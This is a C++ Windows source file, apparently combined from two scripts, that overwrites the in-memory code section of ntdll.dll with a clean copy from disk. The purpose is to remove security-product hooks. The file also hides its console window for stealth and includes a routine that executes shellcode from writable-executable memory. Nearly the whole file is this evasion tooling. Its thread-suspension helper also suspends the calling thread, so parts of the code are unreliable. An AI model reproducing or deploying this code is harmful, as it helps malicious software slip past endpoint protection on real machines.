#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <cstring>

// Utility: Hide console window for stealth
void HideConsole() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hConsole != INVALID_HANDLE_VALUE) {
        // FreeConsole is often better for standalone tools, but DetachConsole is safer if not attached
        FreeConsole();
    }
}

// Structure to hold section info
struct SectionInfo {
    DWORD rva;
    SIZE_T virtualSize;
    DWORD rawOffset;
    SIZE_T rawSize;
    bool found;
};

// Robust PE Parser (From Script 1, enhanced)
static bool FindSection(const BYTE* base, const char* name, SectionInfo& out) {
    if (!base) return false;
    out.found = false;

    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    LONG eLfanew = dos->e_lfanew;
    if (eLfanew <= 0 || eLfanew > 0xFFFF) return false;
    SIZE_T ntOff = static_cast<UINT_PTR>(eLfanew);

    if (ntOff + sizeof(DWORD) > 0x1000) return false; // Basic sanity

    DWORD signature = *reinterpret_cast<const DWORD*>(base + ntOff);
    if (signature != IMAGE_NT_SIGNATURE) return false;

    const IMAGE_FILE_HEADER* fileHeader = reinterpret_cast<const IMAGE_FILE_HEADER*>(
        base + ntOff + sizeof(DWORD));

    SIZE_T optionalOffset = ntOff + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
    WORD magic = *reinterpret_cast<const WORD*>(base + optionalOffset);

    if (magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC &&
        magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return false;
    }

    const IMAGE_SECTION_HEADER* sections = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        base + optionalOffset + fileHeader->SizeOfOptionalHeader);

    WORD sectionCount = fileHeader->NumberOfSections;
    size_t nameLen = std::strlen(name) + 1;

    for (WORD i = 0; i < sectionCount; ++i) {
        // Check bounds of section name
        if (std::memcmp(sections[i].Name, name, nameLen) == 0) {
            out.rva = sections[i].VirtualAddress;
            out.virtualSize = sections[i].Misc.VirtualSize ?
                sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
            out.rawOffset = sections[i].PointerToRawData;
            out.rawSize = sections[i].SizeOfRawData;
            out.found = true;
            return true;
        }
    }

    // Fallback: Find first executable section if .text is missing
    for (WORD i = 0; i < sectionCount; ++i) {
        if ((sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) {
            out.rva = sections[i].VirtualAddress;
            out.virtualSize = sections[i].Misc.VirtualSize ?
                sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
            out.rawOffset = sections[i].PointerToRawData;
            out.rawSize = sections[i].SizeOfRawData;
            out.found = true;
            return true;
        }
    }

    return false;
}

// Efficient Disk Read using Memory Mapping (From Script 2, enhanced)
static bool ReadNtdllFromDisk(const wchar_t* path, BYTE** outBase, SIZE_T* outSize, HANDLE* outMapping, void** outView) {
    HANDLE hFile = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);

    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSizeLI;
    if (!GetFileSizeEx(hFile, &fileSizeLI)) {
        CloseHandle(hFile);
        return false;
    }

    SIZE_T fileSize = static_cast<SIZE_T>(fileSizeLI.QuadPart);
    if (fileSize == 0) {
        CloseHandle(hFile);
        return false;
    }

    HANDLE hMapping = CreateFileMappingW(
        hFile,
        nullptr,
        PAGE_READONLY,
        0,
        0,
        nullptr);

    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* pView = static_cast<BYTE*>(MapViewOfFile(
        hMapping,
        FILE_MAP_READ,
        0,
        0,
        0));

    if (!pView) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    *outBase = pView;
    *outSize = fileSize;
    *outMapping = hMapping;
    *outView = pView;
    CloseHandle(hFile); // File handle can be closed, mapping persists
    return true;
}

// Thread Suspension Logic (Critical for Stability)
class ThreadSuspendGuard {
public:
    ThreadSuspendGuard() {
        m_hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (m_hSnapshot == INVALID_HANDLE_VALUE) return;

        THREADENTRY32 te32 = { 0 };
        te32.dwSize = sizeof(te32);

        if (Thread32First(m_hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) {
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        SuspendThread(hThread);
                        m_hThreads.push_back(hThread);
                    }
                }
            } while (Thread32Next(m_hSnapshot, &te32));
        }
    }

    ~ThreadSuspendGuard() {
        for (HANDLE h : m_hThreads) {
            ResumeThread(h);
            CloseHandle(h);
        }
        CloseHandle(m_hSnapshot);
    }

private:
    HANDLE m_hSnapshot = INVALID_HANDLE_VALUE;
    std::vector<HANDLE> m_hThreads;
};

// Main Unhooking Logic
bool UnhookNtdll() {
    const wchar_t kNtdllPath[] = L"C:\\Windows\\System32\\ntdll.dll";
    
    HMODULE hLoadedNtdll = GetModuleHandleW(L"NTDLL.DLL");
    if (!hLoadedNtdll) return false;

    BYTE* loadedBase = reinterpret_cast<BYTE*>(hLoadedNtdll);

    BYTE* freshBase = nullptr;
    SIZE_T freshSize = 0;
    HANDLE hMapping = nullptr;
    void* pView = nullptr;

    if (!ReadNtdllFromDisk(kNtdllPath, &freshBase, &freshSize, &hMapping, &pView)) {
        return false;
    }

    SectionInfo loadedText;
    SectionInfo freshText;

    bool ok = FindSection(loadedBase, ".text", loadedText) &&
              FindSection(freshBase, ".text", freshText);

    if (!ok) {
        UnmapViewOfFile(pView);
        CloseHandle(hMapping);
        return false;
    }

    // Calculate safe copy size
    SIZE_T destSize = loadedText.virtualSize ? loadedText.virtualSize : loadedText.rawSize;
    const BYTE* src = freshBase + freshText.rawOffset;
    
    // Prevent out-of-bounds read from source
    SIZE_T availableSource = freshSize - freshText.rawOffset;
    SIZE_T copySize = (destSize < availableSource) ? destSize : availableSource;
    
    // Prevent out-of-bounds write to destination
    if (copySize > destSize) copySize = destSize;

    BYTE* dst = loadedBase + loadedText.rva;
    DWORD oldProtect = 0;

    // CRITICAL: Suspend all threads to prevent race conditions
    ThreadSuspendGuard threadGuard;

    bool protectOk = VirtualProtect(dst, destSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!protectOk) {
        UnmapViewOfFile(pView);
        CloseHandle(hMapping);
        return false;
    }

    // Perform the overwrite
    std::memcpy(dst, src, copySize);

    // Zero out padding to match loader behavior
    if (destSize > copySize) {
        ZeroMemory(dst + copySize, destSize - copySize);
    }

    // Restore protection
    DWORD restoreProtect = oldProtect;
    if (!(restoreProtect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
        restoreProtect = PAGE_EXECUTE_READ;
    }
    DWORD dummyProtect = 0;
    VirtualProtect(dst, destSize, restoreProtect, &dummyProtect);

    // CRITICAL: Flush Instruction Cache (Missing in Script 2, Present in Script 1)
    bool cacheOk = FlushInstructionCache(GetCurrentProcess(), dst, destSize);

    // Cleanup disk mapping
    UnmapViewOfFile(pView);
    CloseHandle(hMapping);

    return protectOk && cacheOk;
}

// Shellcode Execution (From Script 1, for verification)
bool ExecuteVerificationPayload() {
    const SIZE_T kFlagOffset = 0x100; // Use a larger offset to avoid overlapping with shellcode

#if defined(_M_X64) || defined(__x86_64__)
    BYTE payload[] = {
        0xB8, 0xEF, 0xBE, 0xAD, 0xDE, // mov eax, 0xDEADBEEF
        0x48, 0x89, 0x05,             // mov [rip+disp32], rax
        0x00, 0x00, 0x00, 0x00,       // disp32
        0xC3                          // ret
    };

    SIZE_T kNextIpOffset = 12;
    int32_t disp = static_cast<int32_t>(
        static_cast<long long>(kFlagOffset) -
        static_cast<long long>(kNextIpOffset));

    std::memcpy(payload + 8, &disp, sizeof(disp));

#elif defined(_M_IX86) || defined(__i386__)
    BYTE payload[] = {
        0xB8, 0xEF, 0xBE, 0xAD, 0xDE, // mov eax, 0xDEADBEEF
        0xB9,                         // mov ecx, <flag_addr>
        0x00, 0x00, 0x00, 0x00,       // flag_addr
        0x89, 0x01,                   // mov [ecx], eax
        0xC3                          // ret
    };
#else
    return true; // Fallback
#endif

    LPVOID shellMem = VirtualAlloc(
        nullptr,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!shellMem) return false;

    std::memcpy(shellMem, payload, sizeof(payload));

#if defined(_M_IX86) || defined(__i386__)
    DWORD flagAddr = static_cast<DWORD>(reinterpret_cast<UINT_PTR>(shellMem) + kFlagOffset);
    std::memcpy(static_cast<BYTE*>(shellMem) + 6, &flagAddr, sizeof(flagAddr));
#endif

    FlushInstructionCache(GetCurrentProcess(), shellMem, 0x1000);

    typedef void (*ShellcodeFunc)();
    ShellcodeFunc fn = reinterpret_cast<ShellcodeFunc>(shellMem);
    
    // Suspend threads again briefly to ensure no interference
    ThreadSuspendGuard guard;
    fn();
    
    MemoryBarrier();

    DWORD flag = *reinterpret_cast<volatile DWORD*>(static_cast<BYTE*>(shellMem) + kFlagOffset);
    bool success = (flag == 0xDEADBEEF);

    VirtualFree(shellMem, 0, MEM_RELEASE);
    return success;
}

int main() {
    HideConsole();

    bool unhookSuccess = UnhookNtdll();
    if (!unhookSuccess) {
        return 1;
    }

    // Optional: Verify that the memory is now writable/executable and functional
    // bool payloadSuccess = ExecuteVerificationPayload();

    return 0;
}
